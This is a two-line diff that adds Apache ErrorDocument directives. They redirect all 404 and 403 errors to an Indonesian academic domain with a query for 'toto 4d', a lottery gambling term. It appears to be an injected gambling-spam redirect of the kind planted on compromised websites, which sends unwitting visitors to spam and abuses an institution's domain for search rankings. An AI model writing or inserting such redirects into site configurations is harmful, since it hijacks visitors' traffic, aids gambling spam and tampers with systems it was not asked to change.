@@ -1,0 +1,2 @@
+ErrorDocument 404 https://staipati.ac.id/?ac_id=toto+4d
+ErrorDocument 403 https://staipati.ac.id/?ac_id=toto+4d
